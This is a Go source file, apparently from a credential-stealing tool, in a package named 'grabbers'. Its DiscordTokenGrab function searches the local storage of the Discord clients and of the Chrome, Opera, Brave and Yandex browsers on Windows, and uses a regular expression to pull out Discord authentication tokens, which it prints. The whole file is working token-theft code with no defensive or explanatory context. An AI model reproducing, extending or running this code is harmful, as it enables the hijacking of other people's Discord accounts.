package grabbers

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"regexp"
	"strings"
)

type DiscordPath struct {
	DiscordType string `bson:type`
	DiscordPath string `bson:path`
}

func checkPathExists(p string) bool {
	_, err := os.Stat(p)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return false
}
func Readln(r *bufio.Reader) (string, error) {
	var (
		isPrefix bool  = true
		err      error = nil
		line, ln []byte
	)
	for isPrefix && err == nil {
		line, isPrefix, err = r.ReadLine()
		ln = append(ln, line...)
	}
	return string(ln), err
}
func findTokens(path string) []string {
	path += "\\Local Storage\\leveldb"
	fmt.Print("\nPath: ", path)
	//tokens := []string{}

	entries, err := os.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}
	tokens := []string{}
	for _, e := range entries {
		n := e.Name()
		if strings.HasSuffix(n, ".ldb") || strings.HasSuffix(n, ".log") {
			pathToOpen := path + "\\" + n
			content, err := ioutil.ReadFile(pathToOpen)
			if err != nil {
				log.Fatal(err)
			}
			r, _ := regexp.Compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}")
			tmp := r.FindString(string(content))
			if tmp != "" {
				fmt.Printf("Found token in : %s \n", path)
				tokens = append(tokens, r.FindString(string(content)))
			}

		} else {
			continue
		}

	}
	return tokens

}

func DiscordTokenGrab() {
	local := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")
	discord := DiscordPath{"discord", roaming + "\\discord"}
	discordCanary := DiscordPath{"canary", roaming + "\\discordcanary"}
	discordPtb := DiscordPath{"ptb", roaming + "\\discordptb"}
	chrome := DiscordPath{"chrome", local + "\\Google\\Chrome\\User Data\\Default"}
	opera := DiscordPath{"opera", roaming + "\\Opera Software\\Opera Stable"}
	brave := DiscordPath{"brave", local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"}
	yandex := DiscordPath{"yandex", local + "\\Yandex\\YandexBrowser\\User Data\\Default"}
	initialPaths := []DiscordPath{discord, discordCanary, discordPtb, chrome, opera, brave, yandex}
	existingPaths := []DiscordPath{}
	for _, element := range initialPaths {
		if checkPathExists(element.DiscordPath) {
			existingPaths = append(existingPaths, element)
		} else {
			//fmt.Printf("Doesnt exist: %s\n", element.DiscordPath)
		}
	}
	//fmt.Print(existingPaths)
	tokens := []string{}
	for _, element := range existingPaths {
		tmp := findTokens(element.DiscordPath)
		for _, val := range tmp {
			tokens = append(tokens, val)
		}

	}
	fmt.Print("\nTOKENS FOUND\n")
	fmt.Println(strings.Join(tokens, "\n"))
}
